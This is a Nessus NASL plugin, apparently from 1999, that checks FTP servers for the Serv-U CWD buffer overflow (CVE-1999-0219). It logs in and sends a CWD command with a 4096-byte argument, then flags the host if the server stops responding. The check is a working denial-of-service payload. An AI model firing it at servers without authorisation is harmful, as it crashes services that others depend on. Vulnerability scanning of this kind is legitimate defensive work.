#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10089);
 script_bugtraq_id(269);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-0219");
 name["english"] = "FTP ServU CWD overflow";
 name["francais"] = "FTP ServU CWD overflow";
 
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to
shut down the remote FTP server by issuing
a CWD command followed by a too long
argument.

This problem allows an attacker to prevent
your site from sharing some resources
with the rest of the world.

Solution : upgrade to the latest version your FTP server.

Risk factor : Medium";


 desc["francais"] = "Il s'est avéré possible
de couper le serveur FTP distant en 
faisant la commande 'CWD' suivie d'un argument
trop long. 

Ce problème permet à des pirates en herbe
d'empecher votre site de partager certaines
ressources avec le reste du monde.

Solution : mettez à jour votre server FTP.

Facteur de risque : Moyen";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts a CWD buffer overflows";
 summary["francais"] = "Essaye un CWD buffers overflows";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_exclude_keys("ftp/msftpd");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#
# The script code starts here
#


include('ftp_func.inc');

port = get_kb_item("Services/ftp");
if(!port)port = 21;

banner = get_ftp_banner(port:port);
if ( ! banner || "Microsoft FTP" >< banner ) exit(0);



login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if(!login)exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
   s = string("CWD ", crap(4096), "\r\n");
   send(socket:soc, data:s);
   r = recv_line(socket:soc, length:1024);
   if(!r)security_warning(port);
  }
  close(soc);
 }
}
